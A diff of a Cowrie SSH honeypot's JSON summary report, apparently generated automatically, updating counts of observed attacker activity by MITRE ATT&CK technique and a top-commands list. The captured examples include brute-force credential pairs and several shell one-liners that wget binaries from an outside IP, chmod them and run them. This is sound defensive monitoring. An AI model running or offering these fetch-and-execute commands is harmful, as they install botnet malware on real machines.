@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-18 12:03:37",
+  "generated": "2026-08-18 13:00:12",
   "totals": {
-    "commands": 8107,
-    "login_failed": 4187,
-    "login_success": 2549,
-    "sessions": 4250
+    "commands": 8153,
+    "login_failed": 4737,
+    "login_success": 2564,
+    "sessions": 4815
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 4187,
+      "count": 4737,
       "examples": [
         "root / 19801024",
         "root / sunsunsun",
@@ -21,14 +21,14 @@
         "root / 826826826"
       ],
       "first": "2026-08-18T00:00:03.054815Z",
-      "last": "2026-08-18T12:00:14.008898Z",
-      "unique_ips": 55
+      "last": "2026-08-18T12:59:41.499978Z",
+      "unique_ips": 63
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 2549,
+      "count": 2564,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "root / 123@@@",
@@ -37,14 +37,14 @@
         "enable\\x00 / system\\x00"
       ],
       "first": "2026-08-18T00:06:39.840434Z",
-      "last": "2026-08-18T12:00:14.447114Z",
-      "unique_ips": 35
+      "last": "2026-08-18T12:44:14.227018Z",
+      "unique_ips": 41
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 96,
+      "count": 108,
       "examples": [
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pmips; chmod 777 pmips; ./pmips; r",
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/x86_64; chmod 777 x86_64; ./x86_64",
@@ -53,14 +53,14 @@
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/parm5; chmod 777 parm5; ./parm5; r"
       ],
       "first": "2026-08-18T02:18:51.232788Z",
-      "last": "2026-08-18T11:56:54.985263Z",
-      "unique_ips": 11
+      "last": "2026-08-18T12:22:34.349283Z",
+      "unique_ips": 12
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 43,
+      "count": 56,
       "examples": [
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pmips; chmod 777 pmips; ./pmips; r",
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/x86_64; chmod 777 x86_64; ./x86_64",
@@ -69,23 +69,24 @@
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/parm5; chmod 777 parm5; ./parm5; r"
       ],
       "first": "2026-08-18T02:18:51.232788Z",
-      "last": "2026-08-18T11:50:39.824340Z",
-      "unique_ips": 10
+      "last": "2026-08-18T12:22:35.640541Z",
+      "unique_ips": 11
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 8,
+      "count": 10,
       "examples": [
         "uname -s -v -n -r -m",
         "/bin/./uname -s -v -n -r -m",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
-        "uname -s -m"
+        "uname -s -m",
+        "uname -a"
       ],
       "first": "2026-08-18T02:27:39.980641Z",
-      "last": "2026-08-18T10:50:40.132408Z",
-      "unique_ips": 6
+      "last": "2026-08-18T12:44:27.381303Z",
+      "unique_ips": 8
     },
     {
       "id": "T1033",
@@ -184,6 +185,18 @@
       10
     ],
     [
+      "zalee",
+      10
+    ],
+    [
+      "za",
+      10
+    ],
+    [
+      "&k`g&k|zpkfq)ES[M",
+      10
+    ],
+    [
       "cd /proc && cat self/cmdline",
       9
     ],
@@ -221,18 +234,6 @@
     ],
     [
       ">/.codi && cd /",
-      6
-    ],
-    [
-      ">/dev/netslink/.codi && cd /dev/netslink/",
-      6
-    ],
-    [
-      ">/dev/shm/.codi && cd /dev/shm/",
-      6
-    ],
-    [
-      ">/bin/.codi && cd /bin/",
       6
     ]
   ]
